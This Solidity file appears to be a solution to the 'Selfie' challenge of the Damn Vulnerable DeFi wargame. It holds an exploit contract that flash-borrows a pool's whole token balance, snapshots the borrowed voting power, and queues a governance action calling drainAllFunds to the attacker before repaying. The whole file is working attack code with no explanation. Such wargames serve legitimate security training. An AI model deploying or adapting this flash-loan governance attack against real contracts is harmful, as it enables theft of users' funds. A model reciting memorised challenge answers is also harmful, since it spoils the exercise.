// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IDamnVulnerableTokenSnapshot {
    function balanceOf(address owner) external returns (uint256);
    function snapshot() external returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface ISimpleGovernance {
    function queueAction(
        address receiver,
        bytes calldata data,
        uint256 weiAmount
    ) external returns (uint256);

    function executeAction(uint256 actionId) external payable;
}

interface ISelfiePool {
    function flashLoan(uint256 amount) external;
    function drainAllFunds(address receiver) external;
}

contract ExploitSelfie {
    ISelfiePool immutable i_selfiePool;
    ISimpleGovernance immutable i_simpleGovernance;
    IDamnVulnerableTokenSnapshot immutable i_damnVulnerableToken;
    address immutable i_attacker;
    uint256 s_actionExploitId;

    constructor(
        address pool,
        address governance,
        address token
    ) {
        i_selfiePool = ISelfiePool(pool);
        i_simpleGovernance = ISimpleGovernance(governance);
        i_damnVulnerableToken = IDamnVulnerableTokenSnapshot(token);
        i_attacker = msg.sender;
    }

    function flashLoan() external {
        uint256 loanAmount = i_damnVulnerableToken.balanceOf(address(i_selfiePool));
        i_selfiePool.flashLoan(loanAmount);
    }

    function receiveTokens(address token, uint256 amount) external {
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            address(i_attacker)
        );
        i_damnVulnerableToken.snapshot();
        s_actionExploitId = i_simpleGovernance.queueAction(
            address(i_selfiePool),
            data,
            0
        );

        i_damnVulnerableToken.transfer(address(i_selfiePool), amount);
    }

    function getExploitActionId() public view returns (uint256) {
        return s_actionExploitId;
    }
}
